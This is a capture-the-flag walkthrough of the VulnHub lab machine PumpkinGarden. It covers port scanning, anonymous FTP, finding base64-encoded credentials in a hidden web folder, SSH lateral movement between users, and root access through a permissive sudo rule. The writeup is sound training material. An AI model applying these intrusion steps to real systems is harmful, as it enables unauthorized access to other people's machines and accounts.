# VulnHub > Pumpkin Garden

**About Release**

* Name: Mission-Pumpkin v1.0: PumpkinGarden
* Date release: 28 Jun 2019
* Author: Jayanth
* Series: Mission-Pumpkin v1.0

**Download**

* PumpkinGarden.ova (Size: 773 MB)
* Download: https://www.dropbox.com/s/xu9mwtn49rijipc/PumpkinGarden.ova?dl=0
* Download (Mirror): https://download.vulnhub.com/missionpumpkin/PumpkinGarden.ova
* Download (Torrent): https://download.vulnhub.com/missionpumpkin/PumpkinGarden.ova.torrent ([Magnet](magnet:?xt=urn:btih:924874C5DBB1ECD10974E157EFE94377701BFE03&dn=PumpkinGarden.ova&tr=http%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.vulnhub.com%3A6969/announce&tr=udp%3A%2F%2Ftracker.openbittorrent.com%3A80/announce&tr=udp%3A%2F%2Ftracker.publicbt.com%3A80/announce&tr=udp%3A%2F%2Ftracker.istole.it%3A6969))

**Description**

Mission-Pumpkin v1.0 is a beginner level CTF series, created by keeping beginners in mind. This CTF series is for people who have basic knowledge of hacking tools and techniques but struggling to apply known tools. I believe that machines in this series will encourage beginners to learn the concepts by solving problems. PumpkinGarden is Level 1 of series of 3 machines under Mission-Pumpkin v1.0. The end goal of this CTF is to gain access to `PumpkinGarden_key` file stored in the `root` account.

# Services Enumeration

Nmap reveals 3 open ports:

~~~
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0              88 Jun 13  2019 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 172.16.222.128
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.2 - secure, fast, stable
|_End of status
1515/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Mission-Pumpkin
3535/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 d8:8d:e7:48:3a:3c:91:0e:3f:43:ea:a3:05:d8:89:e2 (DSA)
|   2048 f0:41:8f:e0:40:e3:c0:3a:1f:4d:4f:93:e6:63:24:9e (RSA)
|   256 fa:87:57:1b:a2:ba:92:76:0c:e7:85:e7:f5:3d:54:b1 (ECDSA)
|_  256 fa:e8:42:5a:88:91:b4:4b:eb:e4:c3:74:2e:23:a5:45 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
~~~

# FTP (port 21)

The FTP service allows anonymous access but doesn't tell us much.

~~~
kali@kali:/data/PumpkinGarden$ ftp garden
Connected to garden.
220 Welcome to Pumpkin's FTP service.
Name (garden:kali): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        113          4096 Jun 11  2019 .
drwxr-xr-x    2 0        113          4096 Jun 11  2019 ..
-rw-r--r--    1 0        0              88 Jun 13  2019 note.txt
226 Directory send OK.
ftp> get note.txt -
remote: note.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note.txt (88 bytes).
Hello Dear! 
Looking for route map to PumpkinGarden? I think jack can help you find it.
226 Transfer complete.
88 bytes received in 0.00 secs (247.6585 kB/s)
~~~

# HTTP (port 1515)

## Main page

Connecting to the web server on port 1515/tcp reveals web page with a hidden comment. This latest gives hints about where to look for.

~~~
kali@kali:/data/PumpkinGarden$ curl -s http://garden:1515/
<html>
<head>
<title>Mission-Pumpkin</title>
<link rel="icon" href="img/favicon.ico" type="image/gif" sizes="16x16">
<style>
body {
  background-color: #FCF0E4;
}
.center {
  display: block;
  margin-left: auto;
  margin-right: auto;
  width: 30%;
}

</style>
</head>
<body>
<img src= "img/pumpkin.gif" class="center" />

<center>
<p style="font-family: verdana; font-size: 120%;">
My dear friend, I <span style="font-size:100%;color:red;">&hearts;</span>
 to sit on a pumpkin and have it all to myself,</br> 
rather than sitting with a crowd on a velvet cushion. So, it is better you get one for yourself.</br></br>
<!-- searching for the route map? Pumpkin images may help you find the way -->
Please Don't disturb me... </br></br></br>
I can't help you in getting your pumpkin.</br>But, I found the route map to <b><i>PumpkinGarden</i></b> somewhere under the hood. 
</p>
</center>


</body>
</html>
~~~

## Secret location in the `/img` folder

There is a secret location in the `/img` folder:

~~~
kali@kali:/data/PumpkinGarden$ curl -s http://garden:1515/img/ | html2text 
****** Index of /img ******
[[ICO]]       Name               Last_modified    Size Description
===========================================================================
[[PARENTDIR]] Parent_Directory                      -  
[[IMG]]       PumpkinGarden.jpeg 2019-06-07 20:54  15K  
[[IMG]]       favicon.ico        2019-06-06 17:02 1.4K  
[[DIR]]       hidden_secret/     2019-06-07 12:34    -  
[[IMG]]       pumpkin.gif        2019-06-06 15:29  33K  
[[IMG]]       pumpkins1.jpg      2019-06-07 21:20  11K  
[[IMG]]       pumpkins2.jpeg     2019-06-07 20:54  13K  
===========================================================================
     Apache/2.4.7 (Ubuntu) Server at garden Port 1515
~~~

A base64 encoded message located in the secret location provides us with credentials:

~~~
kali@kali:/data/PumpkinGarden/files$ curl -s http://garden:1515/img/hidden_secret/clue.txt | base64 -d
scarecrow : 5Qn@$y
~~~

# SSH (port 3535)

## Initial connection (scarecrow)

Using the credentials found previously, we can connect to the SSH service. There is a note in our home folder, which discloses the password to connect as `goblin`:

~~~
kali@kali:/data/PumpkinGarden$ ssh scarecrow@garden -p 3535
------------------------------------------------------------------------------
			  Welcome to Mission-Pumpkin
      All remote connections to this machine are monitored and recorded
------------------------------------------------------------------------------
scarecrow@garden's password: 
Last login: Mon Oct 19 18:48:03 2020 from 172.16.222.128
scarecrow@Pumpkin:~$ ls -la
total 28
drwx------ 2 scarecrow scarecrow 4096 Jun 11  2019 .
drwxr-xr-x 5 root      root      4096 Jun 11  2019 ..
-rw------- 1 scarecrow scarecrow  117 Jun 13  2019 .bash_history
-rw-r--r-- 1 scarecrow scarecrow  220 Jun 11  2019 .bash_logout
-rw-r--r-- 1 scarecrow scarecrow 3637 Jun 11  2019 .bashrc
-rw-r--r-- 1 root      root       167 Jun 11  2019 note.txt
-rw-r--r-- 1 scarecrow scarecrow  675 Jun 11  2019 .profile
scarecrow@Pumpkin:~$ cat note.txt 

Oops!!! I just forgot; keys to the garden are with LordPumpkin(ROOT user)! 
Reach out to goblin and share this "Y0n$M4sy3D1t" to secretly get keys from LordPumpkin.

~~~

## Lateral move (scarecrow -> goblin)

Let's switch to `goblin`:

~~~
scarecrow@Pumpkin:~$ su goblin
Password: 
goblin@Pumpkin:/home/scarecrow$ cd
goblin@Pumpkin:~$ ls -la
total 28
drwx------ 2 goblin goblin 4096 Jun 13  2019 .
drwxr-xr-x 5 root   root   4096 Jun 11  2019 ..
-rw------- 1 goblin goblin   32 Jun 11  2019 .bash_history
-rw-r--r-- 1 goblin goblin  231 Jun 11  2019 .bash_logout
-rw-r--r-- 1 goblin goblin 3637 Jun 11  2019 .bashrc
-rw-r--r-- 1 root   root    328 Jun 11  2019 note
-rw-r--r-- 1 goblin goblin  675 Jun 11  2019 .profile
goblin@Pumpkin:~$ cat note 

Hello Friend! I heard that you are looking for PumpkinGarden key. 
But Key to the garden will be with LordPumpkin(ROOT user), don't worry, I know where LordPumpkin had placed the Key.
You can reach there through my backyard.

Here is the key to my backyard
https://www.securityfocus.com/data/vulnerabilities/exploits/38362.sh

goblin@Pumpkin:~$ 
~~~

The user can connect as root:

~~~
goblin@Pumpkin:~$ sudo -l
[sudo] password for goblin: 
Matching Defaults entries for goblin on Pumpkin:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User goblin may run the following commands on Pumpkin:
    (root) ALL, !/bin/su
~~~

# Root flag

Let's connect as root and get the root flag:

~~~
goblin@Pumpkin:~$ sudo -s
root@Pumpkin:~# id
uid=0(root) gid=0(root) groups=0(root)
root@Pumpkin:~# cd /root
root@Pumpkin:/root# ls -la
total 36
drwx------  3 root root 4096 Jun 13  2019 .
drwxr-xr-x 22 root root 4096 Jun 11  2019 ..
-rw-r--r--  1 root root   22 Jun 13  2019 .bash_logout
-rw-r--r--  1 root root 3106 Jun 11  2019 .bashrc
drwx------  2 root root 4096 Jun 11  2019 .cache
-rw-------  1 root root   17 Jun 13  2019 .nano_history
-rw-r--r--  1 root root  140 Feb 20  2014 .profile
-rw-r--r--  1 root root   25 Jun 13  2019 PumpkinGarden_Key
-rw-r--r--  1 root root   66 Jun 11  2019 .selected_editor
root@Pumpkin:/root# cat PumpkinGarden_Key 
Q29uZ3JhdHVsYXRpb25zIQ==
root@Pumpkin:/root# base64 -d PumpkinGarden_Key 
Congratulations!
~~~
